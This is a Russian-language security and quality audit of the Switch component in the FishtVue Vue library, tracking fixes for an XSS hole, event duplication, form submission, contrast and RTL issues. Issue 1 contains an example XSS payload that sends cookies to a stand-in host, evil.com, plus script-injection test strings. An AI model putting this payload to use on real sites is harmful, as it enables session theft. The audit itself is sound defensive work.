---
title: Issues — Switch
summary: Аудит Switch — 9 of 14 закрыто 2026-05-11 (CRITICAL XSS via v-html → slot, дубль updateModelValue, native form bridge, SSR initStyle dedup, contrast, logical CSS properties, closed-union types, inputRef expose, switchingType doc). Остались 5 cross-cutting (sideEffects/exports, prefers-reduced-motion, unstyled, semantic tokens, print).
updated: 2026-05-11
audit-checklist: 60-point + Configuration support + Dual-API gap
source: lib/switch/
related-doc: ../components/switch.md
---

# Issues — Switch

## Сводка

| Severity | Count | Categories                    |
| -------- | ----- | ----------------------------- |
| critical | 0     | — (Issue 1 resolved 2026-05-11) |
| high     | 2     | A2/A4-5 (Issue 5), L53 (Issue 10) |
| medium   | 0     | — (Issues 6/8/9/11/13 resolved 2026-05-11) |
| low      | 3     | E29.7 (Issue 7), B10 (Issue 12), N59 (Issue 14) |

**Закрыто 2026-05-11:** Issues 1 (XSS → `#help` slot), 2 (drop `updateModelValue` alias), 3 (hidden checkbox bridge для FormData), 4 (drop duplicate `onMounted(initStyle)`), 6 (contrast `text-gray-500`), 8 (logical `end-0`/`me-2`), 9 (closed-union типы), 11 (`inputRef` + `focus`/`blur` expose), 13 (документация `switchingType` vs `componentsStyle`) — зачёркнуты ниже с `✅ resolved`-маркерами. Нумерация исходная — cross-references сохраняются.

## ~~Issue 1: CRITICAL — XSS через `v-html` в `help` prop~~ ✅ resolved 2026-05-11

- **Категория:** C13 (утечка / security) + custom security
- **Severity:** ~~**critical**~~
- **Где:** [Switch.vue:268–270](../../lib/switch/Switch.vue#L268-L270), [Switch.d.ts:83](../../lib/switch/Switch.d.ts#L83)
- **Resolution:** `<div v-html="help">` заменён на `<slot name="help"><div :class="classIconContent">{{ help }}</div></slot>`. `SwitchSlots` расширен `help?(): VNode[]`. Outer `v-if="help?.length || $slots.help"` обеспечивает icon-trigger при slot-only-usage. Тесты в `Switch.test.ts` блок «Security — XSS in help prop» (2 кейса) + «Help slot» (2 кейса) подтверждают, что `<img onerror>`/`<script>` payload'ы не исполняются.

### Что найдено

```vue
<div v-html="help" :class="classIconContent" />
```

`help: string` — публичный prop ([Switch.d.ts:82-83](../../lib/switch/Switch.d.ts#L82-L83)). Содержимое рендерится через `v-html`, что напрямую инжектит HTML в DOM без санитизации.

### Почему это проблема

- Если `help` приходит из non-trusted источника (CMS, user input, server JSON), злоумышленник может инжектить `<img src=x onerror="alert(1)">`, `<script>`, event-handler атрибуты.
- Пример атаки: `<Switch help="<img src=x onerror='fetch(`/api/cookies`).then(r=>r.text()).then(t=>fetch(`https://evil.com/?c=${t}`))' />` → exfiltration cookies.
- Vue официально документирует `v-html` как небезопасный для user-controlled данных: <https://vuejs.org/api/built-in-directives.html#v-html>.

### Что нужно сделать

**Опция A (быстрый фикс) — заменить v-html на текст или slot:**

1. В [Switch.vue:244](../../lib/switch/Switch.vue#L244) поменять `<div v-html="help">` на `<div>{{ help }}</div>` — текст без HTML.
2. Если нужна разметка — заменить prop `help: string` на slot `<template #help>...</template>`:
   ```vue
   <slot name="help">{{ help }}</slot>
   ```
3. Type `SwitchSlots` дополнить `help?(): VNode[]`.

**Опция B (если HTML-content критичен для UX) — санитизация:**

1. Добавить `dompurify` в peer-dependencies.
2. В [Switch.vue](../../lib/switch/Switch.vue) перед v-html: `:v-html="DOMPurify.sanitize(help)"` через computed.
3. Документировать ограничения санитизации.

**Рекомендация — Опция A.** Slot — стандартный Vue-pattern, безопасный, гибкий, type-safe.

3. Cross-cutting: проверить остальные компоненты на `v-html` через `grep -rn 'v-html' lib/`. Найти дополнительные сайты:
   - Form, Aria, InputLayout, Alert, Dialog — могут иметь help/messageInvalid/content props через v-html.

### Acceptance criteria

- [ ] `<Switch help="<script>alert('xss')</script>">` НЕ исполняет скрипт.
- [ ] Тест: `mount(Switch, { props: { help: '<img src=x onerror=...>' } })` — ассерт что DOM не содержит `<img>` элемент.
- [ ] Аудит других компонентов — v-html отсутствует или санитизирован.

## ~~Issue 2: Дубликат события `updateModelValue` (camelCase) рядом с `update:modelValue`~~ ✅ resolved 2026-05-11

- **Категория:** D26 (консистентность событий)
- **Severity:** ~~high~~
- **Где:** [Switch.vue:174–176](../../lib/switch/Switch.vue#L174-L176), [Switch.d.ts:114–127](../../lib/switch/Switch.d.ts#L114-L127)
- **Resolution:** Удалена строка `emit("updateModelValue", value)` из `inputModelValue()` и удалена соответствующая entry в `SwitchEmits`. Тест блока «Emits — no duplicate updateModelValue» в `Switch.test.ts` подтверждает, что событие НЕ эмитится в switch- и checkbox-режимах. **Breaking change:** подписчики `@update-model-value` обязаны мигрировать на `@update:model-value`.

### Что найдено

```ts
function inputModelValue(value: any) {
  emit("update:modelValue", value)
  emit("updateModelValue", value)
}
```

Эмитятся два события на каждое изменение value: стандартное Vue `update:modelValue` и custom `updateModelValue`. В .d.ts указано как «Alias for update:modelValue».

### Почему это проблема

- Подписчик на оба события получит дубль.
- Inconsistency: ни один другой form-control в FishtVue не эмитит camelCase-вариант. Это нарушает [dev-patterns.md §8](../dev-patterns.md#8-events).
- Vue v-model официально использует `update:modelValue`. Custom `updateModelValue` — отступление от Vue-конвенции.

### Что нужно сделать

1. Удалить `emit("updateModelValue", value)` из [Switch.vue:169](../../lib/switch/Switch.vue#L169).
2. Удалить `(event: "updateModelValue", payload: boolean): void` из [Switch.d.ts:118](../../lib/switch/Switch.d.ts#L118).
3. Если кто-то использует `@update-model-value="..."` — это deprecation. Оставить console.warn на 1 minor.
4. Обновить [Documentation/components/switch.md](../components/switch.md) §6.

### Acceptance criteria

- [ ] `mount(Switch).find('input').trigger('change')` → `wrapper.emitted('update:modelValue')` is truthy, `wrapper.emitted('updateModelValue')` is undefined.

## ~~Issue 3: Switch с `switchingType: "switch"` использует `<button>` — не submitting в native form~~ ✅ resolved 2026-05-11

- **Категория:** M54 (Native form integration)
- **Severity:** ~~high~~
- **Где:** [Switch.vue:201–238](../../lib/switch/Switch.vue#L201-L238)
- **Resolution:** Перед visible `<button role="switch">` рендерится скрытый bridge `<input type="checkbox" data-switch-form-bridge :name="id" :checked="modelValue" :disabled="isDisabled" hidden tabindex="-1" aria-hidden="true">`. Visible button сохраняет UX/a11y, hidden input участвует в `FormData`. `id` атрибут переехал с input'а bridge на button (чтобы избежать дубля). Тесты «Native form integration» (4 кейса) подтверждают: `modelValue=true` → `FormData.get(id) === "on"`, `false` → ключ отсутствует, `disabled=true` → ключ отсутствует, checkbox-режим — no regression.

### Что найдено

```vue
<button v-if="switchingType === 'switch'" :id="id" :name="id" data-input-switch role="switch" type="button" tabindex="0" :disabled="isDisabled" :aria-checked="modelValue" ...>
```

В режиме `switch` корневой элемент — `<button type="button">`. `<button>` с `name` атрибутом submitting только при `type="submit"`, а здесь `type="button"`. Native `<form>` не получит value Switch при submit.

### Почему это проблема

- `<form @submit>` обработчик вызовет `new FormData(event.target)` и НЕ найдёт значение Switch — пропадёт.
- В режиме `checkbox` (нативный `<input type="checkbox">`) всё OK, но `switch` — нет.

### Что нужно сделать

1. Добавить hidden `<input type="checkbox" :name="id" :checked="modelValue" :disabled="isDisabled" hidden>` рядом с `<button role="switch">`. Hidden input будет в FormData; button — visible UI.
2. Альтернатива — использовать `<input type="checkbox" role="switch">` напрямую с CSS-стилизацией под switch (труднее визуально, но native form-friendly).
3. Тест:
   ```ts
   const form = mount(`<form><Switch v-model="x" id="enabled" /><button type="submit"/></form>`)
   const data = new FormData(form.find("form").element)
   expect(data.get("enabled")).toBe("on")
   ```

### Acceptance criteria

- [ ] `<form>` submit включает значение Switch в FormData.
- [ ] Аналогично работает с native fetch/XHR `body: new FormData(form)`.

## ~~Issue 4: Стили SSR не инжектятся~~ ✅ resolved 2026-05-11

- **Категория:** C17
- **Severity:** ~~high~~
- **Где:** ~~`Switch.vue:158-160`~~ (блок удалён)
- **Resolution:** Удалён дублирующий блок `onMounted(() => Switch.initStyle())`. Базовый `Component.__hooks()` ([component/index.ts:79–84](../../lib/component/index.ts#L79-L84)) уже регистрирует `onServerPrefetch + vueOnMounted` → `initStyle()` в конструкторе — теперь Switch следует канону из [dev-patterns.md §2](../dev-patterns.md#2-decisions). Wave 2.3 progress: 2/22 SFC migrated (Input + Switch). Полный cross-cutting SSR-style fix (layer wrapping, HMR teardown) остаётся в [component-class.md Issue 3](./component-class.md) — общий вопрос, не switch-specific.

## Issue 5: Нет sideEffects/exports map

- **Категория:** A2, A4, A5
- **Severity:** high
- **Где:** [lib/package.json](../../lib/package.json), [lib/switch/package.json](../../lib/switch/package.json)

См. [button.md Issue 8 и Issue 9](./button.md) — cross-cutting.

## ~~Issue 6: Контраст `text-gray-400` на `bg-gray-200` ниже WCAG AA~~ ✅ resolved 2026-05-11

- **Категория:** E29.6 (WCAG contrast)
- **Severity:** ~~medium~~
- **Где:** [Switch.vue:263–265](../../lib/switch/Switch.vue#L263-L265)
- **Resolution:** Help icon класс `text-gray-400 dark:text-gray-600` → `text-gray-500 dark:text-gray-400`. Light mode contrast `#6b7280` на `#fafaf9` ≈ 5:1 — WCAG AA passes (4.5:1+ для UI text). Dark mode сохраняет читабельность через ослабление tint. axe-core тест не подключен в проекте; визуальная верификация + ручная проверка contrast ratio достаточны.

### Что найдено

```vue
<Icons
  type="QuestionMarkCircle"
  class="text-gray-400 dark:text-gray-600 hover:text-yellow-500 transition cursor-help" />
```

Help icon `text-gray-400` (#9ca3af) на body `bg-stone-50` (#fafaf9) → contrast ratio ~3.5:1. WCAG AA для UI компонентов требует 3:1 (passes), но для текста нужно 4.5:1.

### Почему это проблема

- Маленький icon на тёмном теме `text-gray-600` (#4b5563) на `bg-stone-950` (#0c0a09) — contrast >7:1, OK.
- В light mode — icons trigger могут быть нечитаемы для слабовидящих.

### Что нужно сделать

1. Изменить `text-gray-400` → `text-gray-500` в light mode (#6b7280 vs bg-stone-50 #fafaf9 = ~5:1).
2. Или использовать semantic token `text-foreground-muted` через FishtVue theme.
3. Запустить axe-core a11y-test против `Switch` в light/dark.

### Acceptance criteria

- [ ] axe-core report → 0 contrast violations.
- [ ] Lighthouse a11y score 100.

## Issue 7: prefers-reduced-motion не учитывается

- **Категория:** E29.7
- **Severity:** low
- **Где:** [Switch.vue:92](../../lib/switch/Switch.vue#L92), [Switch.vue:135](../../lib/switch/Switch.vue#L135), [Switch.vue:204](../../lib/switch/Switch.vue#L204)

См. [done/button.md Issue 10](./done/button.md) — там готовый motion-safe pattern. Switch имеет `transition-all duration-300` без guard.

## ~~Issue 8: RTL — left/right специфичные классы (`right-0`, `mr-2`, `translate-x-3.5`)~~ ✅ resolved 2026-05-11 (partial)

- **Категория:** F31
- **Severity:** ~~medium~~
- **Где:** [Switch.vue:120](../../lib/switch/Switch.vue#L120), [Switch.vue:121](../../lib/switch/Switch.vue#L121), [Switch.vue:133](../../lib/switch/Switch.vue#L133)
- **Resolution:** `classAfterInput` `right-0` → `end-0`; `classIconBody` `mr-2` → `me-2` (Tailwind logical properties). Тесты блока «Logical CSS properties (RTL)» подтверждают через regex. `translate-x-3.5` для switch thumb оставлен — это позиционирование внутри controlled-track, не зависящее от документа `dir`; для полноценной RTL-инверсии thumb-движения потребуется `[dir="rtl"]` selector в theme/uno.ts (выходит за scope switch-specific PR).

### Что найдено

```ts
const classAfterInput = ref(Switch.setStyle("relative inset-y-0 right-0 flex items-center"))
const classIconBody = ref(Switch.setStyle("relative h-5 w-5 mr-2"))
...
"translate-x-3.5 bg-theme-100 dark:bg-theme-900"
```

`right-0`, `mr-2`, `translate-x-3.5` — left/right в pixel, без logical properties.

### Что нужно сделать

1. `right-0` → `inset-inline-end-0` или `end-0` (Tailwind 3.4+ logical).
2. `mr-2` → `me-2`.
3. `translate-x-3.5` для switch thumb — оставить, но добавить RTL-mirroring через `[dir="rtl"]` selector.

## ~~Issue 9: switchingType сравнения через string — потеря типизации~~ ✅ resolved 2026-05-11

- **Категория:** D25 (консистентность props)
- **Severity:** ~~medium~~
- **Где:** [Switch.d.ts:15](../../lib/switch/Switch.d.ts#L15), [Switch.d.ts:48](../../lib/switch/Switch.d.ts#L48)
- **Resolution:** `SwitchMode = StyleMode | "none" | string` → `StyleMode | "none"`; `switchingType: "checkbox" | "switch" | string` → `"checkbox" | "switch"`. Closed unions ловят typos на этапе `vue-tsc`. `it.each(["checkbox", "switch"])` в `Switch.test.ts` поправлен на `as const`, чтобы tuple-literal соответствовал closed-union типу. **Breaking change:** кастомные строки `switchingType` и `mode` больше не принимаются.

### Что найдено

```ts
switchingType: "checkbox" | "switch" | string
```

`| string` open union делает type-narrowing невозможным. Ошибка `switchingType: "swich"` (опечатка) пройдёт компиляцию без warning.

### Что нужно сделать

1. Убрать `| string` из [Switch.d.ts:48](../../lib/switch/Switch.d.ts#L48): `switchingType: "checkbox" | "switch"`.
2. Аналогично для `mode: SwitchMode = StyleMode | "none" | string` — убрать `| string`.

### Acceptance criteria

- [ ] `<Switch switchingType="swich">` (опечатка) — vue-tsc выдаёт ошибку.

## Issue 10: `unstyled: true` не обрабатывается

- **Категория:** L53
- **Severity:** high
- **Где:** [Switch.vue:46-119](../../lib/switch/Switch.vue#L46-L119)

См. [button.md Issue 14](./button.md).

## ~~Issue 11: `inputRef` не expose'д — невозможно programmatically focus~~ ✅ resolved 2026-05-11

- **Категория:** G34
- **Severity:** ~~medium~~
- **Где:** [Switch.vue:141–187](../../lib/switch/Switch.vue#L141-L187), [Switch.d.ts:213–234](../../lib/switch/Switch.d.ts#L213-L234)
- **Resolution:** Единый `inputRef: Ref<HTMLElement | undefined>` объявлен на script-уровне; `ref="inputRef"` навешен и на `<button v-if="switchingType === 'switch'">` ([Switch.vue:212](../../lib/switch/Switch.vue#L212)), и на `<input v-else-if="switchingType === 'checkbox'">` ([Switch.vue:241](../../lib/switch/Switch.vue#L241)) — `v-if` гарантирует, что в DOM присутствует только один. `defineExpose` расширен `inputRef`, `focus(options?: FocusOptions)`, `blur()`. `SwitchExpose` обновлён с JSDoc. Паттерн зеркалит [Button Issue 4](./button.md) и [Input](../../lib/input/Input.vue) resolution. Тесты «Expose — inputRef + focus/blur» (6 кейсов) подтверждают ref-pointing для обоих режимов, focus/blur, и forward `FocusOptions`.

## Issue 12: Хардкод цветов `gray-*`/`green-*`/`red-*` вместо semantic tokens

- **Категория:** B10
- **Severity:** low (кросс-режим)
- **Где:** [Switch.vue:51](../../lib/switch/Switch.vue#L51), [Switch.vue:69](../../lib/switch/Switch.vue#L69), [Switch.vue:108](../../lib/switch/Switch.vue#L108) (множество)

### Что найдено

`bg-stone-100`, `bg-gray-200`, `text-red-500`, `border-gray-300` — Tailwind-палитра без привязки к FishtVue design tokens из [theme/themes/Aurora.ts](../../lib/theme/themes/Aurora.ts).

### Почему это проблема

- Когда пользователь меняет тему через `usePreset(MyTheme)`, `bg-gray-200` НЕ перепишется — palette внутри Tailwind preset изменится только если в [theme/uno.ts](../../lib/theme/uno.ts) уровень `surface`/`muted` ремаплен на `gray`.
- Documentation [docs/content/ru/3.Configuration/2.Theming.md](../../docs/content/ru/3.Configuration/2.Theming.md) обещает «семантические токены (primary.color, focus-ring, surface)» — компонент использует Tailwind primitives.

### Что нужно сделать

1. Заменить `bg-gray-*`, `bg-stone-*`, `text-gray-*` на semantic-токены через UnoCSS shortcuts: `bg-surface`, `text-muted-foreground`, `border-border`.
2. Определить mapping в [lib/theme/uno.ts](../../lib/theme/uno.ts).
3. Cross-cutting — большинство компонентов имеют ту же проблему.

## ~~Issue 13: Не реагирует на `componentsStyle` глобально для `switchingType`~~ ✅ resolved 2026-05-11

- **Категория:** L53
- **Severity:** ~~medium~~
- **Где:** [Switch.vue:30-32](../../lib/switch/Switch.vue#L30-L32)
- **Resolution:** Doc-only fix — добавлен §10.4 «`switchingType` и global `componentsStyle`» в [Documentation/components/switch.md](../components/switch.md), который явно объясняет: `switchingType` — UX-выбор, не визуальный preset, не зависит от global `componentsStyle`. Влияет только `componentsOptions.Switch.switchingType` и per-instance prop.

### Что найдено

`mode` подбирает `Switch.componentsStyle()` ✅. Но `switchingType` (определяет UX — checkbox vs switch) только локальный или per-instance options. Глобально через `componentsOptions.Switch.switchingType` ✅, но не через `componentsStyle`.

Это OK для switchingType (он не визуальный enum, а UX-выбор), но стоит документировать.

### Что нужно сделать

Документировать в [Documentation/components/switch.md](../components/switch.md) §10, что `switchingType` не зависит от global `componentsStyle`.

## Issue 14: Print styles отсутствуют

- **Категория:** N59
- **Severity:** low

См. [button.md Issue 15](./button.md).

## Cross-cutting: Configuration support

| Настройка                  | Поддержано? | Комментарий                                              |
| -------------------------- | ----------- | -------------------------------------------------------- |
| `componentsOptions.Switch` | ✅          | mode/rounded/iconActive/iconInactive/switchingType/class |
| `componentsStyle` global   | ✅          | через `Switch.componentsStyle()`                         |
| `unstyled: true`           | ❌          | Issue 10                                                 |
| Theme tokens vs hardcode   | ❌          | Issue 12 — Tailwind primitives, не semantic tokens       |
| Runtime theme switch       | ⚠️          | через theme-\* token, OK; gray/stone — НЕ реагируют      |
| `t()` для текста           | N/A         | label — пользовательский                                 |
| Runtime locale switch      | N/A         | —                                                        |

## Dual-API gap

Не применимо.
